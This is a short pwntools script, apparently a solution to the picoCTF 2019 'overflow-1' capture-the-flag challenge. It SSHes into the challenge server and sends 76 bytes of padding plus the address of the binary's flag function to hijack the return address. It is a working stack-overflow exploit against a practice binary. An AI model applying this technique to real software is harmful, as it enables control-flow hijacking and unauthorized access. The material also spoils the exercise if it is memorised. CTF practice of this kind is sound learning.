from pwn import *

vuln_file = ELF('./vuln')
flag_address = vuln_file.symbols['flag']

print(flag_address)

## queremos un payload
remote = ssh(host='2019shell1.picoctf.com', user='FORGIS98', keyfile="/home/jorge/.ssh/id_rsa_pico")

remote.set_working_directory(b'/problems/overflow-1_5_c76a107db1438c97f349f6b2d98fd6f8')

p = remote.run('./vuln')
#p = process('./vuln')
payload = b'A'*76
payload += p32(flag_address)

p.sendlineafter("Give me a string and lets see what happens: ", payload)
# p.interactive()
print(p.recvall().decode('utf-8'))

